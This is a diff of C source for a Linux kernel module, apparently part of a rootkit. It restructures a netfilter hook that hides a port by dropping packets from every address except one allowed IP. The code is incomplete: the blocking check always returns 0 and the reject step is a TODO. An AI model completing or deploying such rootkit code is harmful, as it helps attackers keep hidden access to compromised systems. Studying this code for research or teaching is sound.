@@ -20,17 +20,16 @@ static unsigned int port;
 /* the ip address which is allowed to connect */
 static u8 ip[4];
 
+
 /* 
- * The Netfilter hook function
- * It is of type nf_hookfn (see netfilter.h)
+ * This function does all the checking.
+ * First it checks if the packet is on one of the blocked ports. If this is
+ * the case, it further checks whether the packet received is from the allowed ip.
+ * If this is the case (or it belongs to an unblocked port), then it returns
+ * false (let through), otherwise it returns true (drop and reject).
  */
-unsigned int
-knocking_hook (const struct nf_hook_ops *ops,
-	struct sk_buff *skb,
-	const struct net_device *in,
-	const struct net_device *out,
-	int (*okfn)(struct sk_buff *))
-{
+static int
+is_port_blocked (struct sk_buff *skb) {
 	struct iphdr *ip_header = (struct iphdr *) skb_network_header(skb);
 	struct tcphdr *tcp_header;
 	struct udphdr *udp_header;
@@ -40,6 +39,8 @@ knocking_hook (const struct nf_hook_ops *ops,
 		
 		if(ntohs(tcp_header->dest) == port) {
 			ROOTKIT_DEBUG("Received packet on filtered tcp port %u.\n", port);
+			
+			
 		}
 	}
 
@@ -48,11 +49,47 @@ knocking_hook (const struct nf_hook_ops *ops,
 		
 		if(ntohs(udp_header->dest) == port) {
 			ROOTKIT_DEBUG("Received packet on filtered udp port %u.\n", port);
+			
+			
 		}
 	}
 
-	/* let the packet through */
-	return NF_ACCEPT;
+	return 0;
+}
+
+/* 
+ * The Netfilter hook function.
+ * It is of type nf_hookfn (see netfilter.h).
+ *
+ * 
+ */
+unsigned int
+knocking_hook (const struct nf_hook_ops *ops,
+	struct sk_buff *skb,
+	const struct net_device *in,
+	const struct net_device *out,
+	int (*okfn)(struct sk_buff *))
+{
+
+	/* check if we need to block this packet */
+	if(is_port_blocked(skb)) {
+
+		/* 
+		 * craft an appropriate REJECT response
+		 */
+		// TODO: REJECT the message		
+
+		/* we can now safely drop the packet */
+		ROOTKIT_DEBUG("Dropped a packet due to port knocking.\n");
+		return NF_DROP;
+
+	} else {
+
+		/* let the packet through */
+		return NF_ACCEPT;
+
+	}
+
 }
 
 /* enable port knocking */
